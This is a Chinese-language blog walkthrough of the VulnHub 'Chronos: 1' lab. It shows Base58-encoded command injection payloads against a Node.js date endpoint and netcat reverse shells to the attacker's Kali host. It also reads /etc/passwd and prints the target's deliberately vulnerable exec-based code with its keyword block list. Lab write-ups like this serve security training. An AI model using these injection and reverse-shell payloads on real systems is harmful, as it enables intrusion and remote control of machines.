@@ -1,0 +1,379 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> VulnHub-3-Chronos:1 · Patrik's Blog</title><meta name="description" content="VulnHub-3-Chronos:1 - Patrik"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Patrik's Blog"><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Patrik's Blog" type="application/atom+xml">
+</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://www.bing.com" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="https://github.com/byesec" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">VulnHub-3-Chronos:1</h1><div class="post-info">2022年4月12日</div><div class="post-content"><blockquote>
+<p><strong>Name</strong>: Chronos: 1</p>
+<p><strong>Date release</strong>: 9 Aug 2021</p>
+<p><strong>Author</strong>: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/author/al1enum,745/">AL1ENUM</a></p>
+<p><strong>Series</strong>: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/series/chronos,495/">Chronos</a></p>
+<p><strong>Download</strong>:<a target="_blank" rel="noopener" href="https://download.vulnhub.com/chronos/Chronos.ova">https://download.vulnhub.com/chronos/Chronos.ova</a></p>
+<p><strong>Description</strong></p>
+<p><strong>Difficulty</strong> : medium</p>
+<p>This works better with VirtualBox rather than VMware.</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo netdiscover -r 10.0.2.0/24</span><br><span class="line">#netdiscover工具的使用中，发现在网段的真实掩码-8会扫描更快</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103144507677.png" alt="image-20211103144507677"></p>
+<p><img src="/Week3.assets/image-20211103144432159.png" alt="image-20211103144432159"></p>
+<p>发现存活主机，判断靶机IP为10.0.2.6 </p>
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.6</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011164411320.png" alt="image-20211011164411320"></p>
+<h3 id="3-探测端口服务"><a href="#3-探测端口服务" class="headerlink" title="3.探测端口服务"></a>3.探测端口服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.6</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103144832211.png" alt="image-20211103144832211"></p>
+<p>探测到的信息：</p>
+<p>​	22端口：开放<strong>SSH</strong>（7.6p1）</p>
+<p>​	80端口：<strong>Apache服务</strong></p>
+<p>​	目标为<strong>Ubuntu</strong>系统</p>
+<p>​	8000端口：<strong>Node.js</strong>    <strong>Express框架</strong></p>
+<h3 id="4-浏览器访问80端口"><a href="#4-浏览器访问80端口" class="headerlink" title="4.浏览器访问80端口"></a>4.浏览器访问80端口</h3><p>访问80端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问http://10.0.2.6</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011165055754.png" alt="image-20211011165055754"></p>
+<p>信息:Chronos(靶机名)-Date（日期）&amp;Time（时间）</p>
+<p>查看源代码，发现<strong>JS脚本</strong></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011165144187.png" alt="image-20211011165144187"></p>
+<p>复制到编辑器内，发现“杂乱晦涩”</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011165214660.png" alt="image-20211011165214660"></p>
+<p>使用数据分析工具CyberChef调用“JavaScript Beautify”模块“美化”</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011170318994.png" alt="image-20211011170318994"></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011170456326.png" alt="image-20211011170456326"></p>
+<p>纵观美化后的代码，发现函数名称仍是为编码处理的，但发现可疑信息（URL）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>
+
+<p>分析：chronos（靶机名）</p>
+<p>​	local（本地&#x2F;本机）</p>
+<p>​	8000（结合之前探测到的信息8000端口也是目标开放的端口）</p>
+<p>​	data?format&#x3D;4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL（data变量<strong>通过format赋值定位某页面</strong>）</p>
+<p>猜测：目标靶机80端口页面嵌入的脚本中包含了该URL</p>
+<p>​	怀疑是否<strong>在该页面加载的过程中</strong>：会去访问该URL–&gt;并从中读取相应页面资源–&gt;放置到当前页面中–&gt;显示相应信息</p>
+<h3 id="5-页面绑定hosts"><a href="#5-页面绑定hosts" class="headerlink" title="5.页面绑定hosts"></a>5.页面绑定hosts</h3><p>思路：尝试在本地将10.0.2.6和chronos.loacl<strong>绑定</strong>–&gt;那么重新访问目标80端口（<a target="_blank" rel="noopener" href="http://10.0.2.6)时--&gt;js脚本就能**顺利访问**脚本中的url--&gt;并从中**读取**相应**页面资源**--&gt;放置到当前页面中--&gt;显示相应的**信息**--&gt;页面应该会有**变化/">http://10.0.2.6）时--&gt;JS脚本就能**顺利访问**脚本中的URL--&gt;并从中**读取**相应**页面资源**--&gt;放置到当前页面中--&gt;显示相应的**信息**--&gt;页面应该会有**变化</a>**</p>
+<p>操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/hosts     </span><br><span class="line">#编辑hosts 手动增加 IP&amp;域名 绑定10.0.2.6和chronos.local</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011171039018.png" alt="image-20211011171039018"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping chronos.local</span><br><span class="line">#验证绑定是否成功，结果显示域名被正确解析到目标靶机IP</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011171625340.png" alt="image-20211011171625340"></p>
+<p>结果显示，成功解析</p>
+<p>刷新&#x2F;重新访问目标80端口（<a target="_blank" rel="noopener" href="http://10.0.2.6)/">http://10.0.2.6）</a></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011171725044.png" alt="image-20211011171725044"></p>
+<p>页面上<strong>打印了时间</strong>，这样发生的<strong>变化</strong>–&gt;意味着JS脚本可以<strong>正常访问</strong>到URL上的资源了–&gt;至此建立了正常的连接</p>
+<hr>
+<h2 id="二、漏洞发现"><a href="#二、漏洞发现" class="headerlink" title="二、漏洞发现"></a>二、漏洞发现</h2><h3 id="1-截断抓包分析"><a href="#1-截断抓包分析" class="headerlink" title="1.截断抓包分析"></a>1.截断抓包分析</h3><p>打开Burpsuite，配置代理，利用截断功能，分析访问页面过程中发生的<strong>通信过程</strong></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011172836302.png" alt="image-20211011172836302"></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011172903372.png" alt="image-20211011172903372"></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011172917467.png" alt="image-20211011172917467"></p>
+<p>通过分析发现<strong>目标响应返回了当前时间信息</strong>，也就是在页面上的显示的时间信息</p>
+<p>将请求Request发送到Repeater内，不进行修改</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011173018704.png" alt="image-20211011173018704"></p>
+<p>不修改时Send重放，正常访问200OK</p>
+<p>修改后Send提交请求，能接收到服务器端的响应信息（时间）</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103152254081.png" alt="image-20211103152254081"></p>
+<p>故可以得到一点，<strong>format参数后的字符</strong>4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL，<strong>对于返回时间是很关键的</strong></p>
+<h3 id="2-命令注入漏洞"><a href="#2-命令注入漏洞" class="headerlink" title="2.命令注入漏洞"></a>2.命令注入漏洞</h3><p>使用CyberChef的Magic模块对该字符进行解密</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103151711496.png" alt="image-20211103151711496"></p>
+<p>得到的明文为：（Base58编码…）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>看到明文这样的格式，想到了Linux的date命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date</span><br></pre></td></tr></table></figure>
+
+<p>date后添加明文内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103152932781.png" alt="image-20211103152932781"></p>
+<p><strong>猜测当访问Web程序URL时，服务端使用的是这条操作系统指令，那么是否可以用符号连接执行命令注入呢？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27; || ls  #不可行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27; &amp;&amp; ls #可行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153232194.png" alt="image-20211103153232194"></p>
+<p>结合之前的URL，服务端能执行的内容必须是Base58编码之后的格式</p>
+<p>故使用CyberChef将&amp;&amp;ls转为Base58编码形式</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153344923.png" alt="image-20211103153344923"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到：&amp;&amp;ls   --Base58编码--&gt;   yZSGA</span><br></pre></td></tr></table></figure>
+
+<p>BurpSuite:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为yZSGA--&gt;Send重放</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153429917.png" alt="image-20211103153429917"></p>
+<p>成功接受到服务端响应–&gt;返回当前目录下的文件信息–&gt;<strong>确认存在命令注入漏洞</strong></p>
+<hr>
+<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><h3 id="1-利用思路"><a href="#1-利用思路" class="headerlink" title="1.利用思路"></a>1.利用思路</h3><p>如何利用命令注入漏洞？–&gt;<strong>尝试查看用户可执行文件目录（&#x2F;bin）</strong>–&gt;看是否有可利用点</p>
+<p>CyberChef:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;ls /bin --To Base58--&gt;VAZYW9RHPu6D（下面不再为转码贴附图片**-_-**）</span><br></pre></td></tr></table></figure>
+
+<p>BurpSuite:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为VAZYW9RHPu6D--&gt;Send重放</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153619965.png" alt="image-20211103153619965"></p>
+<p>整理目前发现的<strong>可利用信息</strong>：</p>
+<p>1.发现存在bash，之后若能获取shell，则可以执行bashell反弹</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085536530.png" alt="image-20211104085536530"></p>
+<p>2.发现存在nc，但不确定nc版本是否有-e参数方便我们建立反弹shell （nc的-e参数具有程序重定向–连接执行的作用）</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153858760.png" alt="image-20211103153858760"></p>
+<h3 id="2-使用nc建立连接"><a href="#2-使用nc建立连接" class="headerlink" title="2.使用nc建立连接"></a>2.使用nc建立连接</h3><h4 id="验证nc是否可执行"><a href="#验证nc是否可执行" class="headerlink" title="验证nc是否可执行"></a>验证nc是否可执行</h4><p>进行测试，确认nc命令能否正常执行？能否与kali建立反弹连接？</p>
+<p>kali:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444    #nc侦听4444端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153939292.png" alt="image-20211103153939292"></p>
+<p>CyberChef:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 --To Base58--&gt;2an39LDoLgxbVq6NMgJeN3RL7</span><br></pre></td></tr></table></figure>
+
+<p>BurpSuite:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为2an39LDoLgxbVq6NMgJeN3RL7--&gt;Send重放</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085113440.png" alt="image-20211104085113440"></p>
+<p>显示报错，但在kali端监听端发现<strong>连接可以被正常建立</strong></p>
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085132470.png" alt="image-20211104085132470"></p>
+<h4 id="验证nc是否包含-e参数"><a href="#验证nc是否包含-e参数" class="headerlink" title="验证nc是否包含-e参数"></a>验证nc是否包含-e参数</h4><h5 id="1-若有则使用-e参数加载反弹shell"><a href="#1-若有则使用-e参数加载反弹shell" class="headerlink" title="1.若有则使用-e参数加载反弹shell"></a>1.若有则使用-e参数加载反弹shell</h5><p>kali：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444  #nc侦听4444端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085819231.png" alt="image-20211104085819231"></p>
+<p>CyberChef:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 -e /bin/bash --To Base58--&gt;ajvuL5RnJqominfmDbYteLFr6rCZdb3VR633BCa2fH</span><br></pre></td></tr></table></figure>
+
+<p>BurpSuite:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为ajvuL5RnJqominfmDbYteLFr6rCZdb3VR633BCa2fH--&gt;Send重放</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104090046890.png" alt="image-20211104090046890"></p>
+<p>仍然报错，说明不包含-e参数，且nc建立连接失败，则<strong>确定目标系统上nc版本不包含-e参数</strong></p>
+<h5 id="2-若无则可以使用nc串联的方法通过管道方式在两个侦听接口上获得反弹shell"><a href="#2-若无则可以使用nc串联的方法通过管道方式在两个侦听接口上获得反弹shell" class="headerlink" title="2.若无则可以使用nc串联的方法通过管道方式在两个侦听接口上获得反弹shell"></a>2.若无则可以使用<strong>nc串联</strong>的方法通过管道方式在两个侦听接口上获得反弹shell</h5><p>kali:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444  #nc侦听4444端口</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555  #nc侦听5555端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104092959229.png" alt="image-20211104092959229"></p>
+<p>CyberChef:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 | /bin/bash | nc 10.0.2.4 5555</span><br></pre></td></tr></table></figure>
+
+<p>–To Base58–&gt;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7BFuYVuCc4LN4GRLNFCY4RZyKX7GVbfGEaUnJSCQ2RUmJmcZNi67Nw5ewqKqyTusCZS</span><br></pre></td></tr></table></figure>
+
+<p>BurpSuite:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为7BFuYVuCc4LN4GRLNFCY4RZyKX7GVbfGEaUnJSCQ2RUmJmcZNi67Nw5ewqKqyTusCZS--&gt;Send重放</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104093156854.png" alt="image-20211104093156854"></p>
+<p>至此，nc<strong>建立连接成功</strong></p>
+<h3 id="3-寻找信息"><a href="#3-寻找信息" class="headerlink" title="3.寻找信息"></a>3.寻找信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104093314649.png" alt="image-20211104093314649"></p>
+<p>发现在当前&#x2F;opt&#x2F;chronos目录下，并<strong>没有类似flag的信息</strong></p>
+<p>尝试查看其他目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>​	<img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104094438824.png" alt="image-20211104094438824">	</p>
+<p>​	</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104094604888.png" alt="image-20211104094604888"></p>
+<p>​	发现在home目录下<strong>存在用户imera</strong></p>
+<p>​	尝试查看imera用户文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd imera</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104094950343.png" alt="image-20211104094950343"></p>
+<p>很可惜，查看失败，发现只有imera用户自己可以对user.txt进行读写，<strong>只有提权才能执行查看</strong></p>
+<hr>
+<h2 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h2><h3 id="1-初次尝试提权"><a href="#1-初次尝试提权" class="headerlink" title="1.初次尝试提权"></a>1.初次尝试提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id  #当前用户权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104095325207.png" alt="image-20211104095325207"></p>
+<p>是一个名为www-data的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a   #利用是否存在内核漏洞</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104095419553.png" alt="image-20211104095419553"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l	#利用是否存在sudo命令漏洞</span><br></pre></td></tr></table></figure>
+
+<p>没有反馈.</p>
+<p>利用常见的提权方法，都没能找到突破口。</p>
+<p>至此，陷入了困境…-_-</p>
+<hr>
+<h3 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2.代码审计"></a>2.代码审计</h3><p>尝试在其他目录看能否发现突破口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/chronos</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104095949572.png" alt="image-20211104095949572"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat package.json</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100153967.png" alt="image-20211104100153967"></p>
+<blockquote>
+<p>{<br> “dependencies”: {<br>   “bs58”: “^4.0.1”,<br>   “cors”: “^2.8.5”,<br>   “express”: “^4.17.1”<br> }<br>}</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat app.js</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100502437.png" alt="image-20211104100502437"></p>
+<blockquote>
+<p>&#x2F;&#x2F; created by alienum for Penetration Testing<br>const express &#x3D; require(‘express’);<br>const { exec } &#x3D; require(“child_process”);<br>const bs58 &#x3D; require(‘bs58’);<br>const app &#x3D; express();</p>
+<p>const port &#x3D; 8000;</p>
+<p>const cors &#x3D; require(‘cors’);</p>
+<p>app.use(cors());</p>
+<p>app.get(‘&#x2F;‘, (req,res) &#x3D;&gt;{</p>
+<p>res.sendFile(“&#x2F;var&#x2F;www&#x2F;html&#x2F;index.html”);<br>});</p>
+<p>app.get(‘&#x2F;date’, (req, res) &#x3D;&gt; {</p>
+<p>var agent &#x3D; req.headers[‘user-agent’];<br>var cmd &#x3D; ‘date ‘;<br>const format &#x3D; req.query.format;<br>const bytes &#x3D; bs58.decode(format);<br>var decoded &#x3D; bytes.toString();<br>var concat &#x3D; cmd.concat(decoded);<br>if (agent &#x3D;&#x3D;&#x3D; ‘Chronos’) {<br>  if (concat.includes(‘id’) || concat.includes(‘whoami’) || concat.includes(‘python’) || concat.includes(‘nc’) || concat.includes(‘bash’) || concat.includes(‘php’) || concat.includes(‘which’) || concat.includes(‘socat’)) {</p>
+<p>  res.send(“Something went wrong”);</p>
+<p>  }<br>  exec(concat, (error, stdout, stderr) &#x3D;&gt; {<br>      if (error) {<br>          console.log(<code>error: $&#123;error.message&#125;</code>);<br>          return;<br>      }<br>      if (stderr) {<br>          console.log(<code>stderr: $&#123;stderr&#125;</code>);<br>          return;<br>      }<br>      res.send(stdout);<br>  });<br>}<br>else{</p>
+<p>  res.send(“Permission Denied”);<br>}<br>})</p>
+<p>app.listen(port,() &#x3D;&gt; {</p>
+<p>console.log(<code>Server running at $&#123;port&#125;</code>);</p>
+<p>})</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..                   #来到上级目录</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100626091.png" alt="image-20211104100626091"></p>
+<p>发现chronos-v2文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd chronos-v2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100808654.png" alt="image-20211104100808654"></p>
+<p>发现是另一个web应用，index.html（主页面），frontend（前端），backend（后端）</p>
+<p>进入backend目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd backend</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100901040.png" alt="image-20211104100901040"></p>
+<p>同样看到了package.json文件，进行查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat package.json</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104101138166.png" alt="image-20211104101138166"></p>
+<blockquote>
+<p>{<br> “name”: “some-website”,<br> “version”: “1.0.0”,<br> “description”: “”,<br> “main”: “server.js”,<br> “scripts”: {<br>   “start”: “node server.js”<br> },<br> “author”: “”,<br> “license”: “ISC”,<br> “dependencies”: {<br>   “ejs”: “^3.1.5”,<br>   “express”: “^4.17.1”,<br>   <strong>“express-fileupload”: “^1.1.7-alpha.3”</strong>   #文件上传？？？？？？<br> }<br>}</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat server.js</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104101352160.png" alt="image-20211104101352160"></p>
+<blockquote>
+<p>const express &#x3D; require(‘express’);<br>const fileupload &#x3D; require(“express-fileupload”);<br>const http &#x3D; require(‘http’)</p>
+<p>const app &#x3D; express();</p>
+<p>app.use(fileupload({ parseNested: true }));</p>
+<p>app.set(‘view engine’, ‘ejs’);<br>app.set(‘views’, “&#x2F;opt&#x2F;chronos-v2&#x2F;frontend&#x2F;pages”);</p>
+<p>app.get(‘&#x2F;‘, (req, res) &#x3D;&gt; {<br>  res.render(‘index’)<br>});</p>
+<p>const server &#x3D; http.Server(app);<br><strong>const addr &#x3D; “127.0.0.1”</strong>         #reason：为什么扫描的时候没有扫描到8080端口 answer：因为Web应用只有在本机才能访问<br><strong>const port &#x3D; 8080;</strong><br>server.listen(port, addr, () &#x3D;&gt; {<br>  console.log(‘Server listening on ‘ + addr + ‘ port ‘ + port);<br>});</p>
+</blockquote>
